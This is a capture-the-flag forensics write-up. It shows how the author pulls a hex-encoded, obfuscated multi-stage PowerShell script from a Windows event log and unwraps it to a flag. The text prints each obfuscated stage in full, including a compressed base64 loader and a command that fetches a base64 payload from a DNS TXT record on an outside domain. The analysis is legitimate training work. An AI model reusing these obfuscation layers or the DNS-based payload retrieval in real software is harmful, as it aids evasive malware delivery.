# Texas Chainsaw Massacre: Tokyo Drift

### Challenge Description
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d83c96b4-973b-43f8-8c43-7ca92b6ecdce)

### Solution

Unzipping the archive we got we can see we only have a .evtx file for Application Logs.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/ac5844e5-f10c-4f2e-a72d-0f2c9042cbeb)

Using this [tool](https://github.com/omerbenamram/evtx/releases/tag/v0.8.0) we can convert this file into a readable format.

```bash
./evtx_dump-v0.8.0-x86_64-unknown-linux-gnu Application\ Logs.evtx >converted_application_log
```
The first thing that jumps out when we read the file is some hex encoded data in the Binary tag.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/73beaa98-82a0-480f-9193-b18f16cbbd48)

Let's look for all of the tags that contain data:  

```bash
cat converted_application_log|grep Binary|grep -v '<Binary></Binary>'
```
We soon find a big blob:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0edee597-ae13-4e6e-b107-2f69b6af3b43)

Which we can hex decode and we find ourselves a powershell script that looks quite obfuscated:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/66164489-043a-4e1c-a705-63151af3146a)

At first I wanted to start deobfuscating it but I got a better idea. I wanted to see how this gets executed so I started looking for an IEX somewhere. At the end of the script we have this part:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e6f5fc9b-af8e-494e-85be-29565d1f249d)

If we just slap that into powershell (in a segregated Windows VM) we can see it just translated to `IEX`:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d02446b4-0607-46b6-9506-05d74c9c412a)

So instead of executing the payload, let's just print it out. We are replacing the IEX with a simple `echo` and get this payload:

```powershell
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )
hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l
 (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+
's/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+
hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+
'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+
'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+
hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+
'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. echo
```
When we run this code in powershell, it prints out the second stage of the powershell script:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/c47febec-dae9-4ebd-a98f-396b9b1b188f)

Close to the end of the script, we can see an `Invoke-Expression` written backwards so let's remove that and replace it with a backwards `echo`:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2cf94e51-d2a1-40d3-828e-3311f200c3f4)

We now have this script:

```powershell
. ( $ENv:CoMSpEc[4,24,25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-
63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+
' ,_kw'+'l (RED'+'AeRmaertS.oI'+' t'+'C'+'ejbO-W'+'En { HCaERoF'+'fKI) sSERpMoCe'+'d'+'::'+']edOM'+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b0Y'+'==wDyD4p+Ss/l/'+
'i+5GtatJKyfNjO'+'3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'zzU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+
'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+
'ugkTBFTcCPaSH0QjpFyw'+'aQy'+'HtPUG'+'DL0BK3'+'lClrHAv'+'4GOpVK'+'UN'+'mGzIDeraEvlpckC9EG'+'gIaf96jSmS'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31XqK'+'d4dbt'+
'bth1RdSigEaE'+'JNERMLUxV'+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6es'+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+
'IsSerPmoc.OI.me'+'TsYS'+' '+' tCejbO-WE'+'n ( '(((ohce ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" )
```
After we run this script, we get yet another stage:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2828f87d-f8da-4c26-a156-f792740443ba)

I have a feeling this one is using IEX as well, but we can confirm by inputting the command in powershell again:   
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/ded12aa5-7b01-4b02-9241-7c07b5a032e2)

Now that we've confirmed that it's also using IEX, we replace it with an echo:

```powershell
( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13
W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCz
WmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5
+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) | . echo
```
We seem to be getting closer as we now a very easily readable script:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/de7d53ec-ecdd-471e-bd66-00b237f313a5)

I spent a little bit of time here being confused about the .zip "file" and started looking back into the .evtx log thinking I missed some hex encoded blob. But then I remembered about the "brilliant" idea Google had about releasing .zip TLDs so I tested to see if the command would actually resolve to something.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/b8556cfe-19eb-464a-b984-39f646407ced)

Now knowing that it's a valid domain/address, I ripped just the part of the script that I cared about and ran it to get the flag:  

```powershell
$5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | echo}
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/71ffdd32-f7c4-4cf5-93a6-04bf6aa64cab)

flag{409537347c2fae01ef9826c2506ac660}



